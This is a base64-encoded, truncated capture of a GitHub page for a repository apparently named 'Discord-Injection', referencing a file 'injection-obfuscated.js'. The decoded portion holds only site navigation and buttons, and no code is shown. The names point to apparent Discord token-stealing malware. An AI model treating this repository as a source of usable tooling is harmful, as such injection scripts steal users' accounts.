dGVtc2NvcGUgaXRlbXR5cGU9Imh0dHA6Ly9zY2hlbWEub3JnL1NvZnR3YXJlU291cmNlQ29kZSIgY2xhc3M9IiI+CiAgICA8bWFpbiBpZD0ianMtcmVwby1wamF4LWNvbnRhaW5lciIgPgogICAgICAKICAgICAgCiAgICAgIAoKCgoKCgogIAogIDxkaXYgaWQ9InJlcG9zaXRvcnktY29udGFpbmVyLWhlYWRlciIgIGNsYXNzPSJwdC0zIGhpZGUtZnVsbC1zY3JlZW4iIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS1jb2xvci1wYWdlLWhlYWRlci1iZyk7IiBkYXRhLXR1cmJvLXJlcGxhY2U+CgogICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggZmxleC13cmFwIGZsZXgtanVzdGlmeS1lbmQgbWItMyAgcHgtMyBweC1tZC00IHB4LWxnLTUiIHN0eWxlPSJnYXA6IDFyZW07Ij4KCiAgICAgICAgPGRpdiBjbGFzcz0iZmxleC1hdXRvIG1pbi13aWR0aC0wIHdpZHRoLWZpdCBtci0zIj4KICAgICAgICAgICAgCiAgPGRpdiBjbGFzcz0iIGQtZmxleCBmbGV4LXdyYXAgZmxleC1pdGVtcy1jZW50ZXIgd2ItYnJlYWstd29yZCBmMyB0ZXh0LW5vcm1hbCI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tcmVwbyBjb2xvci1mZy1tdXRlZCBtci0yIj4KICAgIDxwYXRoIGQ9Ik0yIDIuNUEyLjUgMi41IDAgMCAxIDQuNSAwaDguNzVhLjc1Ljc1IDAgMCAxIC43NS43NXYxMi41YS43NS43NSAwIDAgMS0uNzUuNzVoLTIuNWEuNzUuNzUgMCAwIDEgMC0xLjVoMS43NXYtMmgtOGExIDEgMCAwIDAtLjcxNCAxLjcuNzUuNzUgMCAxIDEtMS4wNzIgMS4wNUEyLjQ5NSAyLjQ5NSAwIDAgMSAyIDExLjVabTEwLjUtMWgtOGExIDEgMCAwIDAtMSAxdjYuNzA4QTIuNDg2IDIuNDg2IDAgMCAxIDQuNSA5aDhaTTUgMTIuMjVhLjI1LjI1IDAgMCAxIC4yNS0uMjVoMy41YS4yNS4yNSAwIDAgMSAuMjUuMjV2My4yNWEuMjUuMjUgMCAwIDEtLjQuMmwtMS40NS0xLjA4N2EuMjQ5LjI0OSAwIDAgMC0uMyAwTDUuNCAxNS43YS4yNS4yNSAwIDAgMS0uNC0uMloiPjwvcGF0aD4KPC9zdmc+CiAgICAKICAgIDxzcGFuIGNsYXNzPSJhdXRob3IgZmxleC1zZWxmLXN0cmV0Y2giIGl0ZW1wcm9wPSJhdXRob3IiPgogICAgICA8YSBjbGFzcz0idXJsIGZuIiByZWw9ImF1dGhvciIgZGF0YS1ob3ZlcmNhcmQtdHlwZT0idXNlciIgZGF0YS1ob3ZlcmNhcmQtdXJsPSIvdXNlcnMvc2tvY2h3YXNoZXJlL2hvdmVyY2FyZCIgZGF0YS1vY3RvLWNsaWNrPSJob3ZlcmNhcmQtbGluay1jbGljayIgZGF0YS1vY3RvLWRpbWVuc2lvbnM9ImxpbmtfdHlwZTpzZWxmIiBocmVmPSIvc2tvY2h3YXNoZXJlIj4KICAgICAgICBza29jaHdhc2hlcmUKPC9hPiAgICA8L3NwYW4+CiAgICA8c3BhbiBjbGFzcz0ibXgtMSBmbGV4LXNlbGYtc3RyZXRjaCBjb2xvci1mZy1tdXRlZCI+Lzwvc3Bhbj4KICAgIDxzdHJvbmcgaXRlbXByb3A9Im5hbWUiIGNsYXNzPSJtci0yIGZsZXgtc2VsZi1zdHJldGNoIj4KICAgICAgPGEgZGF0YS1wamF4PSIjcmVwby1jb250ZW50LXBqYXgtY29udGFpbmVyIiBkYXRhLXR1cmJvLWZyYW1lPSJyZXBvLWNvbnRlbnQtdHVyYm8tZnJhbWUiIGhyZWY9Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24iPkRpc2NvcmQtSW5qZWN0aW9uPC9hPgogICAgPC9zdHJvbmc+CgogICAgPHNwYW4+PC9zcGFuPjxzcGFuIGNsYXNzPSJMYWJlbCBMYWJlbC0tc2Vjb25kYXJ5IHYtYWxpZ24tbWlkZGxlIG1yLTEiPlB1YmxpYzwvc3Bhbj4KICA8L2Rpdj4KCgogICAgICAgIDwvZGl2PgoKICAgICAgICA8ZGl2IGlkPSJyZXBvc2l0b3J5LWRldGFpbHMtY29udGFpbmVyIiBkYXRhLXR1cmJvLXJlcGxhY2U+CiAgICAgICAgICAgIDx1bCBjbGFzcz0icGFnZWhlYWQtYWN0aW9ucyBmbGV4LXNocmluay0wIGQtbm9uZSBkLW1kLWlubGluZSIgc3R5bGU9InBhZGRpbmc6IDJweCAwOyI+CiAgICAKICAgICAgCgogIDxsaT4KICAgICAgICAgICAgPGEgaHJlZj0iL2xvZ2luP3JldHVybl90bz0lMkZza29jaHdhc2hlcmUlMkZEaXNjb3JkLUluamVjdGlvbiIgcmVsPSJub2ZvbGxvdyIgZGF0YS1oeWRyby1jbGljaz0ieyZxdW90O2V2ZW50X3R5cGUmcXVvdDs6JnF1b3Q7YXV0aGVudGljYXRpb24uY2xpY2smcXVvdDssJnF1b3Q7cGF5bG9hZCZxdW90Ozp7JnF1b3Q7bG9jYXRpb25faW5fcGFnZSZxdW90OzomcXVvdDtub3RpZmljYXRpb24gc3Vic2NyaXB0aW9uIG1lbnUgd2F0Y2gmcXVvdDssJnF1b3Q7cmVwb3NpdG9yeV9pZCZxdW90OzpudWxsLCZxdW90O2F1dGhfdHlwZSZxdW90OzomcXVvdDtMT0dfSU4mcXVvdDssJnF1b3Q7b3JpZ2luYXRpbmdfdXJsJnF1b3Q7OiZxdW90O2h0dHBzOi8vZ2l0aHViLmNvbS9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vYmxvYi9tYWluL2luamVjdGlvbi1vYmZ1c2NhdGVkLmpzJnF1b3Q7LCZxdW90O3VzZXJfaWQmcXVvdDs6bnVsbH19IiBkYXRhLWh5ZHJvLWNsaWNrLWhtYWM9IjJkZTkwM2EwYWU0Y2ZkOTJkMDYzZjQ1ZDMxYTZhNjY1ZThmODQwMDAwMzk5OTBlMjI3ZmU4ZTVkYmFjMWY2YWYiIGFyaWEtbGFiZWw9IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byBjaGFuZ2Ugbm90aWZpY2F0aW9uIHNldHRpbmdzIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0idG9vbHRpcHBlZCB0b29sdGlwcGVkLXMgYnRuLXNtIGJ0biI+ICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tYmVsbCBtci0yIj4KICAgIDxwYXRoIGQ9Ik04IDE2YTIgMiAwIDAgMCAxLjk4NS0xLjc1Yy4wMTctLjEzNy0uMDk3LS4yNS0uMjM1LS4yNWgtMy41Yy0uMTM4IDAtLjI1Mi4xMTMtLjIzNS4yNUEyIDIgMCAwIDAgOCAxNlpNMyA1YTUgNSAwIDAgMSAxMCAwdjIuOTQ3YzAgLjA1LjAxNS4wOTguMDQyLjEzOWwxLjcwMyAyLjU1NUExLjUxOSAxLjUxOSAwIDAgMSAxMy40ODIgMTNIMi41MThhMS41MTYgMS41MTYgMCAwIDEtMS4yNjMtMi4zNmwxLjcwMy0yLjU1NEEuMjU1LjI1NSAwIDAgMCAzIDcuOTQ3Wm01LTMuNUEzLjUgMy41IDAgMCAwIDQuNSA1djIuOTQ3YzAgLjM0Ni0uMTAyLjY4My0uMjk0Ljk3bC0xLjcwMyAyLjU1NmEuMDE3LjAxNyAwIDAgMC0uMDAzLjAxbC4wMDEuMDA2YzAgLjAwMi4wMDIuMDA0LjAwNC4wMDZsLjAwNi4wMDQuMDA3LjAwMWgxMC45NjRsLjAwNy0uMDAxLjAwNi0uMDA0LjAwNC0uMDA2LjAwMS0uMDA3YS4wMTcuMDE3IDAgMCAwLS4wMDMtLjAxbC0xLjcwMy0yLjU1NGExLjc0NSAxLjc0NSAwIDAgMS0uMjk0LS45N1Y1QTMuNSAzLjUgMCAwIDAgOCAxLjVaIj48L3BhdGg+Cjwvc3ZnPk5vdGlmaWNhdGlvbnMKPC9hPgogIDwvbGk+CgogIDxsaT4KICAgICAgICAgIDxhIGljb249InJlcG8tZm9ya2VkIiBpZD0iZm9yay1idXR0b24iIGhyZWY9Ii9sb2dpbj9yZXR1cm5fdG89JTJGc2tvY2h3YXNoZXJlJTJGRGlzY29yZC1JbmplY3Rpb24iIHJlbD0ibm9mb2xsb3ciIGRhdGEtaHlkcm8tY2xpY2s9InsmcXVvdDtldmVudF90eXBlJnF1b3Q7OiZxdW90O2F1dGhlbnRpY2F0aW9uLmNsaWNrJnF1b3Q7LCZxdW90O3BheWxvYWQmcXVvdDs6eyZxdW90O2xvY2F0aW9uX2luX3BhZ2UmcXVvdDs6JnF1b3Q7cmVwbyBkZXRhaWxzIGZvcmsgYnV0dG9uJnF1b3Q7LCZxdW90O3JlcG9zaXRvcnlfaWQmcXVvdDs6Njc2MTAwMjI2LCZxdW90O2F1dGhfdHlwZSZxdW90OzomcXVvdDtMT0dfSU4mcXVvdDssJnF1b3Q7b3JpZ2luYXRpbmdfdXJsJnF1b3Q7OiZxdW90O2h0dHBzOi8vZ2l0aHViLmNvbS9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vYmxvYi9tYWluL2luamVjdGlvbi1vYmZ1c2NhdGVkLmpzJnF1b3Q7LCZxdW90O3VzZXJfaWQmcXVvdDs6bnVsbH19IiBkYXRhLWh5ZHJvLWNsaWNrLWhtYWM9IjIzMTEyMGQ3NDk0ZWRiODc3ZWM2NzY0NGMwZDQ5NDliYjNlN2QzOGE1NThlZjE5MDRkYjVlYzRmMTMyY2M2ZWYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJidG4tc20gYnRuIj4gICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1yZXBvLWZvcmtlZCBtci0yIj4KICAgIDxwYXRoIGQ9Ik01IDUuMzcydi44NzhjMCAuNDE0LjMzNi43NS43NS43NWg0LjVhLjc1Ljc1IDAgMCAwIC43NS0uNzV2LS44NzhhMi4yNSAyLjI1IDAgMSAxIDEuNSAwdi44NzhhMi4yNSAyLjI1IDAgMCAxLTIuMjUgMi4yNWgtMS41djIuMTI4YTIuMjUxIDIuMjUxIDAgMSAxLTEuNSAwVjguNWgtMS41QTIuMjUgMi4yNSAwIDAgMSAzLjUgNi4yNXYtLjg3OGEyLjI1IDIuMjUgMCAxIDEgMS41IDBaTTUgMy4yNWEuNzUuNzUgMCAxIDAtMS41IDAgLjc1Ljc1IDAgMCAwIDEuNSAwWm02Ljc1Ljc1YS43NS43NSAwIDEgMCAwLTEuNS43NS43NSAwIDAgMCAwIDEuNVptLTMgOC43NWEuNzUuNzUgMCAxIDAtMS41IDAgLjc1Ljc1IDAgMCAwIDEuNSAwWiI+PC9wYXRoPgo8L3N2Zz5Gb3JrCiAgICA8c3BhbiBpZD0icmVwby1uZXR3b3JrLWNvdW50ZXIiIGRhdGEtcGpheC1yZXBsYWNlPSJ0cnVlIiBkYXRhLXR1cmJvLXJlcGxhY2U9InRydWUiIHRpdGxlPSIwIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iQ291bnRlciI+MDwvc3Bhbj4KPC9hPgogIDwvbGk+CgogIDxsaT4KICAgICAgICA8ZGl2IGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJCdG5Hcm91cCBkLWZsZXgiPgogICAgICAgIDxhIGhyZWY9Ii9sb2dpbj9yZXR1cm5fdG89JTJGc2tvY2h3YXNoZXJlJTJGRGlzY29yZC1JbmplY3Rpb24iIHJlbD0ibm9mb2xsb3ciIGRhdGEtaHlkcm8tY2xpY2s9InsmcXVvdDtldmVudF90eXBlJnF1b3Q7OiZxdW90O2F1dGhlbnRpY2F0aW9uLmNsaWNrJnF1b3Q7LCZxdW90O3BheWxvYWQmcXVvdDs6eyZxdW90O2xvY2F0aW9uX2luX3BhZ2UmcXVvdDs6JnF1b3Q7c3RhciBidXR0b24mcXVvdDssJnF1b3Q7cmVwb3NpdG9yeV9pZCZxdW90Ozo2NzYxMDAyMjYsJnF1b3Q7YXV0aF90eXBlJnF1b3Q7OiZxdW90O0xPR19JTiZxdW90OywmcXVvdDtvcmlnaW5hdGluZ191cmwmcXVvdDs6JnF1b3Q7aHR0cHM6Ly9naXRodWIuY29tL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9ibG9iL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMmcXVvdDssJnF1b3Q7dXNlcl9pZCZxdW90OzpudWxsfX0iIGRhdGEtaHlkcm8tY2xpY2staG1hYz0iZWY3NzJjMjA1Y2ViNWE4MTU0NzM3OWJlYzhmNzczNzJiYTdjMGQ2ZTBiZGM1NjYzMjZhOGUyZTJhMDc3Y2VlNSIgYXJpYS1sYWJlbD0iWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHN0YXIgYSByZXBvc2l0b3J5IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0idG9vbHRpcHBlZCB0b29sdGlwcGVkLXMgYnRuLXNtIGJ0biBCdG5Hcm91cC1pdGVtIj4gICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1zdGFyIHYtYWxpZ24tdGV4dC1ib3R0b20gZC1pbmxpbmUtYmxvY2sgbXItMiI+CiAgICA8cGF0aCBkPSJNOCAuMjVhLjc1Ljc1IDAgMCAxIC42NzMuNDE4bDEuODgyIDMuODE1IDQuMjEuNjEyYS43NS43NSAwIDAgMSAuNDE2IDEuMjc5bC0zLjA0NiAyLjk3LjcxOSA0LjE5MmEuNzUxLjc1MSAwIDAgMS0xLjA4OC43OTFMOCAxMi4zNDdsLTMuNzY2IDEuOThhLjc1Ljc1IDAgMCAxLTEuMDg4LS43OWwuNzItNC4xOTRMLjgxOCA2LjM3NGEuNzUuNzUgMCAwIDEgLjQxNi0xLjI4bDQuMjEtLjYxMUw3LjMyNy42NjhBLjc1Ljc1IDAgMCAxIDggLjI1Wm0wIDIuNDQ1TDYuNjE1IDUuNWEuNzUuNzUgMCAwIDEtLjU2NC40MWwtMy4wOTcuNDUgMi4yNCAyLjE4NGEuNzUuNzUgMCAwIDEgLjIxNi42NjRsLS41MjggMy4wODQgMi43NjktMS40NTZhLjc1Ljc1IDAgMCAxIC42OTggMGwyLjc3IDEuNDU2LS41My0zLjA4NGEuNzUuNzUgMCAwIDEgLjIxNi0uNjY0bDIuMjQtMi4xODMtMy4wOTYtLjQ1YS43NS43NSAwIDAgMS0uNTY0LS40MUw4IDIuNjk0WiI+PC9wYXRoPgo8L3N2Zz48c3BhbiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iZC1pbmxpbmUiPgogICAgICAgICAgU3Rhcgo8L3NwYW4+ICAgICAgICAgIDxzcGFuIGlkPSJyZXBvLXN0YXJzLWNvdW50ZXItc3RhciIgYXJpYS1sYWJlbD0iMCB1c2VycyBzdGFycmVkIHRoaXMgcmVwb3NpdG9yeSIgZGF0YS1zaW5ndWxhci1zdWZmaXg9InVzZXIgc3RhcnJlZCB0aGlzIHJlcG9zaXRvcnkiIGRhdGEtcGx1cmFsLXN1ZmZpeD0idXNlcnMgc3RhcnJlZCB0aGlzIHJlcG9zaXRvcnkiIGRhdGEtdHVyYm8tcmVwbGFjZT0idHJ1ZSIgdGl0bGU9IjAiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJDb3VudGVyIGpzLXNvY2lhbC1jb3VudCI+MDwvc3Bhbj4KPC9hPiAgICAgICAgPGJ1dHRvbiBhcmlhLWxhYmVsPSJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gYWRkIHRoaXMgcmVwb3NpdG9yeSB0byBhIGxpc3QiIHR5cGU9ImJ1dHRvbiIgZGlzYWJsZWQ9ImRpc2FibGVkIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iYnRuLXNtIGJ0biBCdG5Hcm91cC1pdGVtIHB4LTIiPiAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLXRyaWFuZ2xlLWRvd24iPgogICAgPHBhdGggZD0ibTQuNDI3IDcuNDI3IDMuMzk2IDMuMzk2YS4yNS4yNSAwIDAgMCAuMzU0IDBsMy4zOTYtMy4zOTZBLjI1LjI1IDAgMCAwIDExLjM5NiA3SDQuNjA0YS4yNS4yNSAwIDAgMC0uMTc3LjQyN1oiPjwvcGF0aD4KPC9zdmc+CjwvYnV0dG9uPjwvZGl2PgogIDwvbGk+Cgo8L3VsPgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICAgIDxkaXYgaWQ9InJlc3BvbnNpdmUtbWV0YS1jb250YWluZXIiIGRhdGEtdHVyYm8tcmVwbGFjZT4KPC9kaXY+CgoKICAgICAgICAgIDxuYXYgZGF0YS1wamF4PSIjanMtcmVwby1wamF4LWNvbnRhaW5lciIgYXJpYS1sYWJlbD0iUmVwb3NpdG9yeSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImpzLXJlcG8tbmF2IGpzLXNpZGVuYXYtY29udGFpbmVyLXBqYXgganMtcmVzcG9uc2l2ZS11bmRlcmxpbmVuYXYgb3ZlcmZsb3ctaGlkZGVuIFVuZGVybGluZU5hdiBweC0zIHB4LW1kLTQgcHgtbGctNSI+CgogIDx1bCBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iVW5kZXJsaW5lTmF2LWJvZHkgbGlzdC1zdHlsZS1ub25lIj4KICAgICAgPGxpIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJkLWlubGluZS1mbGV4Ij4KICA8YSBpZD0iY29kZS10YWIiIGhyZWY9Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24iIGRhdGEtdGFiLWl0ZW09ImkwY29kZS10YWIiIGRhdGEtc2VsZWN0ZWQtbGlua3M9InJlcG9fc291cmNlIHJlcG9fZG93bmxvYWRzIHJlcG9fY29tbWl0cyByZXBvX3JlbGVhc2VzIHJlcG9fdGFncyByZXBvX2JyYW5jaGVzIHJlcG9fcGFja2FnZXMgcmVwb19kZXBsb3ltZW50cyByZXBvX2F0dGVzdGF0aW9ucyAvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uIiBkYXRhLXBqYXg9IiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXIiIGRhdGEtdHVyYm8tZnJhbWU9InJlcG8tY29udGVudC10dXJiby1mcmFtZSIgZGF0YS1ob3RrZXk9ImcgYyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtVbmRlcmxpbmUgbmF2YmFyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtDbGljayB0YWImcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7Q29kZSZxdW90OywmcXVvdDt0YXJnZXQmcXVvdDs6JnF1b3Q7VU5ERVJMSU5FX05BVi5UQUImcXVvdDt9IiBhcmlhLWN1cnJlbnQ9InBhZ2UiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJVbmRlcmxpbmVOYXYtaXRlbSBuby13cmFwIGpzLXJlc3BvbnNpdmUtdW5kZXJsaW5lbmF2LWl0ZW0ganMtc2VsZWN0ZWQtbmF2aWdhdGlvbi1pdGVtIHNlbGVjdGVkIj4KICAgIAogICAgICAgICAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tY29kZSBVbmRlcmxpbmVOYXYtb2N0aWNvbiBkLW5vbmUgZC1zbS1pbmxpbmUiPgogICAgPHBhdGggZD0ibTExLjI4IDMuMjIgNC4yNSA0LjI1YS43NS43NSAwIDAgMSAwIDEuMDZsLTQuMjUgNC4yNWEuNzQ5Ljc0OSAwIDAgMS0xLjI3NS0uMzI2Ljc0OS43NDkgMCAwIDEgLjIxNS0uNzM0TDEzLjk0IDhsLTMuNzItMy43MmEuNzQ5Ljc0OSAwIDAgMSAuMzI2LTEuMjc1Ljc0OS43NDkgMCAwIDEgLjczNC4yMTVabS02LjU2IDBhLjc1MS43NTEgMCAwIDEgMS4wNDIuMDE4Ljc1MS43NTEgMCAwIDEgLjAxOCAxLjA0MkwyLjA2IDhsMy43MiAzLjcyYS43NDkuNzQ5IDAgMCAxLS4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMS0uNzM0LS4yMTVMLjQ3IDguNTNhLjc1Ljc1IDAgMCAxIDAtMS4wNloiPjwvcGF0aD4KPC9zdmc+CiAgICAgICAgPHNwYW4gZGF0YS1jb250ZW50PSJDb2RlIj5Db2RlPC9zcGFuPgogICAgICAgICAgPHNwYW4gaWQ9ImNvZGUtcmVwby10YWItY291bnQiIGRhdGEtcGpheC1yZXBsYWNlPSIiIGRhdGEtdHVyYm8tcmVwbGFjZT0iIiB0aXRsZT0iTm90IGF2YWlsYWJsZSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IkNvdW50ZXIiPjwvc3Bhbj4KCgogICAgCjwvYT48L2xpPgogICAgICA8bGkgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImQtaW5saW5lLWZsZXgiPgogIDxhIGlkPSJpc3N1ZXMtdGFiIiBocmVmPSIvc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL2lzc3VlcyIgZGF0YS10YWItaXRlbT0iaTFpc3N1ZXMtdGFiIiBkYXRhLXNlbGVjdGVkLWxpbmtzPSJyZXBvX2lzc3VlcyByZXBvX2xhYmVscyByZXBvX21pbGVzdG9uZXMgL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9pc3N1ZXMiIGRhdGEtcGpheD0iI3JlcG8tY29udGVudC1wamF4LWNvbnRhaW5lciIgZGF0YS10dXJiby1mcmFtZT0icmVwby1jb250ZW50LXR1cmJvLWZyYW1lIiBkYXRhLWhvdGtleT0iZyBpIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O1VuZGVybGluZSBuYXZiYXImcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O0NsaWNrIHRhYiZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtJc3N1ZXMmcXVvdDssJnF1b3Q7dGFyZ2V0JnF1b3Q7OiZxdW90O1VOREVSTElORV9OQVYuVEFCJnF1b3Q7fSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlVuZGVybGluZU5hdi1pdGVtIG5vLXdyYXAganMtcmVzcG9uc2l2ZS11bmRlcmxpbmVuYXYtaXRlbSBqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0iPgogICAgCiAgICAgICAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1pc3N1ZS1vcGVuZWQgVW5kZXJsaW5lTmF2LW9jdGljb24gZC1ub25lIGQtc20taW5saW5lIj4KICAgIDxwYXRoIGQ9Ik04IDkuNWExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM1oiPjwvcGF0aD48cGF0aCBkPSJNOCAwYTggOCAwIDEgMSAwIDE2QTggOCAwIDAgMSA4IDBaTTEuNSA4YTYuNSA2LjUgMCAxIDAgMTMgMCA2LjUgNi41IDAgMCAwLTEzIDBaIj48L3BhdGg+Cjwvc3ZnPgogICAgICAgIDxzcGFuIGRhdGEtY29udGVudD0iSXNzdWVzIj5Jc3N1ZXM8L3NwYW4+CiAgICAgICAgICA8c3BhbiBpZD0iaXNzdWVzLXJlcG8tdGFiLWNvdW50IiBkYXRhLXBqYXgtcmVwbGFjZT0iIiBkYXRhLXR1cmJvLXJlcGxhY2U9IiIgdGl0bGU9IjAiIGhpZGRlbj0iaGlkZGVuIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iQ291bnRlciI+MDwvc3Bhbj4KCgogICAgCjwvYT48L2xpPgogICAgICA8bGkgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImQtaW5saW5lLWZsZXgiPgogIDxhIGlkPSJwdWxsLXJlcXVlc3RzLXRhYiIgaHJlZj0iL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9wdWxscyIgZGF0YS10YWItaXRlbT0iaTJwdWxsLXJlcXVlc3RzLXRhYiIgZGF0YS1zZWxlY3RlZC1saW5rcz0icmVwb19wdWxscyBjaGVja3MgL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9wdWxscyIgZGF0YS1wamF4PSIjcmVwby1jb250ZW50LXBqYXgtY29udGFpbmVyIiBkYXRhLXR1cmJvLWZyYW1lPSJyZXBvLWNvbnRlbnQtdHVyYm8tZnJhbWUiIGRhdGEtaG90a2V5PSJnIHAiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7VW5kZXJsaW5lIG5hdmJhciZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Q2xpY2sgdGFiJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O1B1bGwgcmVxdWVzdHMmcXVvdDssJnF1b3Q7dGFyZ2V0JnF1b3Q7OiZxdW90O1VOREVSTElORV9OQVYuVEFCJnF1b3Q7fSIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlVuZGVybGluZU5hdi1pdGVtIG5vLXdyYXAganMtcmVzcG9uc2l2ZS11bmRlcmxpbmVuYXYtaXRlbSBqcy1zZWxlY3RlZC1uYXZpZ2F0aW9uLWl0ZW0iPgogICAgCiAgICAgICAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1naXQtcHVsbC1yZXF1ZXN0IFVuZGVybGluZU5hdi1vY3RpY29uIGQtbm9uZSBkLXNtLWlubGluZSI+CiAgICA8cGF0aCBkPSJNMS41IDMuMjVhMi4yNSAyLjI1IDAgMSAxIDMgMi4xMjJ2NS4yNTZhMi4yNTEgMi4yNTEgMCAxIDEtMS41IDBWNS4zNzJBMi4yNSAyLjI1IDAgMCAxIDEuNSAzLjI1Wm01LjY3Ny0uMTc3TDkuNTczLjY3N0EuMjUuMjUgMCAwIDEgMTAgLjg1NFYyLjVoMUEyLjUgMi41IDAgMCAxIDEzLjUgNXY1LjYyOGEyLjI1MSAyLjI1MSAwIDEgMS0xLjUgMFY1YTEgMSAwIDAgMC0xLTFoLTF2MS42NDZhLjI1LjI1IDAgMCAxLS40MjcuMTc3TDcuMTc3IDMuNDI3YS4yNS4yNSAwIDAgMSAwLS4zNTRaTTMuNzUgMi41YS43NS43NSAwIDEgMCAwIDEuNS43NS43NSAwIDAgMCAwLTEuNVptMCA5LjVhLjc1Ljc1IDAgMSAwIDAgMS41Ljc1Ljc1IDAgMCAwIDAtMS41Wm04LjI1L